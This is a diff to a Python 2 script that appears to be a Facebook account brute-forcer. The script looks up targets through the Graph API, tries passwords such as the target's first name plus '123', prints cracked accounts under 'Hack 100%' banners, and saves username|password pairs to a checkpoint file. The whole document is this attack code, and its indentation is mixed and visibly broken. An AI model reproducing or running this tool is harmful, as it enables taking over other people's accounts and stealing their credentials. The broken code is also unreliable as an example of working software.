@@ -328,6 +328,7 @@ def pilih_super():
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
 					cekpoint.append(user+pass1)
+				else:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 		        b = json.loads(a.text)
 		        pass2 = j['first_name'] + '123'
@@ -336,12 +337,14 @@ def pilih_super():
 			if 'access_token' in q:
 				print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass2
 				oks.append(user+pass2)
-                        if 'www.facebook.com' in q["error_msg"]:
+			else:
+                                if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;94mCheckpoint\x1b[1;97m-\x1b[1;91m▬\x1b[1;97m-' + user + '-\x1b[1;91m▬\x1b[1;97m-' + pass2
 					cek = open("out/checkpoint.txt", "a")
 					cek.write(user+"|"+pass2+"\n")
 					cek.close()
 					cekpoint.append(user+pass2)
+				else:
 		        a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 		        b = json.loads(a.text)
 	                pass3 = b['first_name'] + '123'
@@ -350,7 +353,8 @@ def pilih_super():
 		        if 'access_token' in q:
 			        print '\x1b[1;92mHack 100%💉\x1b[1;97m-\x1b[1;92m▬\x1b[1;97m-' + user + '-\x1b[1;92m▬\x1b[1;97m-' + pass3
 		                oks.append(user+pass3)
-                        if 'www.facebook.com' in q["error_msg"]:
+			else:
+                                if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;94mCheckpoint\x1b[1;97m-\x1b[1;91m▬\x1b[1;97m-' + user + '-\x1b[1;91m▬\x1b[1;97m-' + pass3
 					cek = open("out/checkpoint.txt", "a")
 					cek.write(user+"|"+pass3+"\n")
